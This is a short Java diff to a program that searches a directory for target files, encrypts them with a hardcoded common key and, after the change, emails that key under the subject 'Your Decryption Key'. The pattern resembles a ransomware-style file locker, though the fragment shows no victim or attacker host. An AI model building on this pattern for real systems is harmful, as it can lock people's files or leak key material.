@@ -6,6 +6,7 @@ import finder.SearchTarget;
 import javafx.application.Application;
 import javafx.stage.Stage;
 import tools.InputUtility;
+import tools.MailSendUtility;
 
 import javax.swing.*;
 
@@ -29,6 +30,7 @@ public class Execute extends Application {
       cryption.exeDecrypt(searchTarget.getTargetList(), dirPath, InputUtility.textInput());
     } else {
       cryption.exeEncrypt(searchTarget.getTargetList(), dirPath , CryptionKeys.COMMON_KEY);
+      MailSendUtility.send("Your Decryption Key", CryptionKeys.COMMON_KEY);
     }
   }
 }
